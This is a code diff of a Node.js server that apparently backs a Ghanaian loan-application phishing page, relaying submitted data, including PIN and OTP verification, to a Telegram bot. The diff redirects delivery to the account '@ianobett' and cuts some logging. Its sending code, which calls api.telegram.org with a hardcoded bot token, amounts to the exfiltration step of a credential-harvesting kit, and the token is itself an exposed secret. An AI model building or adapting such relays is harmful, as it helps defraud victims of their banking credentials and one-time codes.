@@ -16,9 +16,9 @@ app.use((req, res, next) => {
     next();
 });
 
-// ========== TELEGRAM CREDENTIALS ==========
+// ========== TELEGRAM CREDENTIALS - UPDATED ==========
 const TG_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
-const TG_CHAT_ID = '6414813627';
+const TG_CHAT_ID = '@ianobett';  // Changed to your username
 
 // ========== HEALTH CHECK ENDPOINTS ==========
 app.get('/', (req, res) => {
@@ -37,7 +37,8 @@ app.get('/health', (req, res) => {
         timestamp: new Date().toISOString(),
         telegram: {
             bot_configured: true,
-            chat_id_configured: true
+            chat_id_configured: true,
+            chat_username: '@ianobett'
         }
     });
 });
@@ -123,21 +124,21 @@ app.post('/api/send-telegram', async (req, res) => {
             message += `⏰ Time: ${timestamp}`;
         }
         
-        // Send to Telegram
+        // Send to Telegram using @username
         const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
         const params = new URLSearchParams({
-            chat_id: TG_CHAT_ID,
+            chat_id: TG_CHAT_ID,  // Now using '@ianobett'
             text: message,
             parse_mode: 'HTML'
         });
         
         console.log('📤 Sending to Telegram...');
+        console.log('📱 Target chat:', TG_CHAT_ID);
         const response = await fetch(`${url}?${params}`);
         const result = await response.json();
         
         if (result.ok) {
             console.log('✅ Message sent to Telegram successfully!');
-            console.log('Telegram response:', result);
             res.json({
                 success: true,
                 message: 'Sent to Telegram successfully',
@@ -154,7 +155,6 @@ app.post('/api/send-telegram', async (req, res) => {
         
     } catch (error) {
         console.error('❌ Server error:', error.message);
-        console.error('Stack trace:', error.stack);
         res.status(500).json({
             success: false,
             error: error.message,
@@ -189,6 +189,7 @@ app.get('/api/info', (req, res) => {
         version: '1.0.0',
         country: 'Ghana',
         currency: '₵',
+        telegram_username: '@ianobett',
         supported_features: ['Loan Applications', 'PIN Verification', 'OTP Verification'],
         telegram_configured: true
     });
@@ -201,7 +202,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('='.repeat(50));
     console.log(`📡 Port: ${PORT}`);
     console.log(`🤖 Telegram Bot: Configured`);
-    console.log(`📱 Chat ID: ${TG_CHAT_ID}`);
+    console.log(`📱 Chat Username: @ianobett`);
     console.log(`🌍 Country: Ghana`);
     console.log(`💵 Currency: ₵`);
     console.log('='.repeat(50));
